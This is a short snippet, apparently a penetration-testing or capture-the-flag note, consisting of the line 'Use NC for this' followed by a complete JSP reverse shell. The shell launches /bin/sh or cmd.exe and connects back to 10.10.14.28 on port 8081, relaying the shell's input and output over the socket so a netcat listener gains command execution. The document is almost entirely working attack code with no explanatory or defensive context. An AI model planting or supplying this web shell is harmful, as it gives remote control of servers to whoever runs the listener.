Use NC for this
```
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream vu;
    OutputStream ma;

    StreamConnector( InputStream vu, OutputStream ma )
    {
      this.vu = vu;
      this.ma = ma;
    }

    public void run()
    {
      BufferedReader ie  = null;
      BufferedWriter syy = null;
      try
      {
        ie  = new BufferedReader( new InputStreamReader( this.vu ) );
        syy = new BufferedWriter( new OutputStreamWriter( this.ma ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ie.read( buffer, 0, buffer.length ) ) > 0 )
        {
          syy.write( buffer, 0, length );
          syy.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ie != null )
          ie.close();
        if( syy != null )
          syy.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.28", 8081 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```